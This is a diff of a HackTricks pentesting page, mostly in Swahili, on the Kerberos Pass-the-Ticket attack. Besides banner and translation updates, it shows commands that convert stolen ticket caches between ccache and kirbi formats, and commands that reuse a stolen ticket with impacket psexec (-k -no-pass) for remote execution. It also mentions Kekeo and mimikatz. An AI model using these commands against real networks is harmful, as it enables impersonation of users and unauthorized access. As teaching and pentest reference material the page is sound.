@@ -1,39 +1,40 @@
-# Pita Tiketi
+# Pass the Ticket
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=pass-the-ticket) kujenga na **kutumia mifumo ya kazi** kwa kutumia zana za **jamii za juu zaidi** ulimwenguni.\
-Pata Ufikiaji Leo:
+Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=pass-the-ticket) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Get Access Today:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}
 
-## Pita Tiketi (PTT)
+## Pass The Ticket (PTT)
 
-Katika njia ya kushambulia **Pita Tiketi (PTT)**, wadukuzi **wanateka tiketi ya uthibitisho wa mtumiaji** badala ya nywila au thamani za hash. Tiketi hii iliyotekwa hutumiwa kujifanya kuwa mtumiaji, kupata ufikiaji usioruhusiwa kwenye rasilimali na huduma ndani ya mtandao.
+Katika mbinu ya shambulio ya **Pass The Ticket (PTT)**, washambuliaji **hupora tiketi ya uthibitishaji ya mtumiaji** badala ya nywila zao au thamani za hash. Tiketi hii iliyoporwa inatumika kisha **kufanana na mtumiaji**, ikipata ufikiaji usioidhinishwa kwa rasilimali na huduma ndani ya mtandao.
 
 **Soma**:
 
-* [Kuvuna tiketi kutoka kwa Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
-* [Kuvuna tiketi kutoka kwa Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
+* [Kuvuna tiketi kutoka Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
+* [Kuvuna tiketi kutoka Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
 
 ### **Kubadilisha tiketi za Linux na Windows kati ya majukwaa**
 
-Zana ya [**ticket\_converter**](https://github.com/Zer1t0/ticket\_converter) inabadilisha muundo wa tiketi kwa kutumia tiketi yenyewe na faili ya pato.
+Zana ya [**ticket\_converter**](https://github.com/Zer1t0/ticket\_converter) inabadilisha muundo wa tiketi kwa kutumia tiketi yenyewe tu na faili ya matokeo.
 ```bash
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 Converting ccache => kirbi
@@ -41,9 +42,11 @@ Converting ccache => kirbi
 python ticket_converter.py velociraptor.kirbi velociraptor.ccache
 Converting kirbi => ccache
 ```
-### Shambulizi la Kupitisha Tiketi
+In Windows [Kekeo](https://github.com/gentilkiwi/kekeo) inaweza kutumika.
 
-Katika Windows [Kekeo](https://github.com/gentilkiwi/kekeo) inaweza kutumika.
+### Shambulio la Pass The Ticket
+
+{% code title="Linux" %}
 ```bash
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
@@ -67,21 +70,22 @@ klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=pass-the-ticket) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za **jamii ya juu zaidi** duniani.\
+Tumia [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=pass-the-ticket) kujenga na **kujiendesha** kazi kwa urahisi zenye nguvu za zana za jamii **zilizoendelea zaidi** duniani.\
 Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}
 
+{% hint style="success" %}
+Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
+{% endhint %}
